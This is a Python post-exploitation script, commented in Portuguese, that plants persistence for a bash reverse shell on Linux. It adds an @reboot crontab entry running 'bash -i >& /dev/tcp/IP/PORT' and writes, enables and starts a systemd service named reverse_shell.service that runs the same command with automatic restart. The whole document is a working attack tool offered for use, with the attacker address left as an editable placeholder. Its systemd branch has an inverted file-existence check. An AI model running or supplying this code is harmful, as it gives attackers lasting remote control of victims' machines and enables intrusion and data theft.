#!/usr/bin/env python3

import subprocess
import os

# Definir o IP e a Porta
ip = "192.168.29.135"  # editar
porta = "221"  # editar

# Comando para adicionar a persistência no crontab
def configurar_crontab(ip, porta):
    try:
        # Verifica se já existe o comando no crontab
        resultado = subprocess.run(f"crontab -l | grep -q 'bash -i >& /dev/tcp/{ip}/{porta} 0>&1'", 
                                   shell=True, capture_output=True)
        
        # Se não existe, adiciona no crontab
        if resultado.returncode != 0:
            comando = f"(crontab -l 2>/dev/null; echo '@reboot /bin/bash -c \"bash -i >& /dev/tcp/{ip}/{porta} 0>&1\"') | crontab -"
            subprocess.run(comando, shell=True, check=True)
            print("[*] Persistência via Crontab configurada com sucesso.")
        else:
            print("[*] Persistência via Crontab já configurada.")
    
    except subprocess.CalledProcessError as e:
        print(f"Erro ao configurar o crontab: {e}")

# Verificar e configurar persistência via Systemd
def configurar_systemd(ip, porta):
    service_path = "/etc/systemd/system/reverse_shell.service"

    if os.path.isfile(service_path):
        print("[*] Configurando persistência via Systemd...")

        service_content = f"""[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{porta} 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            # Cria ou sobrescreve o arquivo de serviço do systemd
            with open(service_path, 'w') as service_file:
                service_file.write(service_content)

            # Ativa e inicia o serviço
            subprocess.run("sudo systemctl enable reverse_shell.service", shell=True, check=True)
            subprocess.run("sudo systemctl start reverse_shell.service", shell=True, check=True)

            print("[*] Persistência via Systemd configurada com sucesso.")
        
        except Exception as e:
            print(f"Erro ao configurar Systemd: {e}")
    else:
        print(f"[*] O serviço Systemd {service_path} já está configurado.")

# Executar as funções
configurar_crontab(ip, porta)
configurar_systemd(ip, porta)
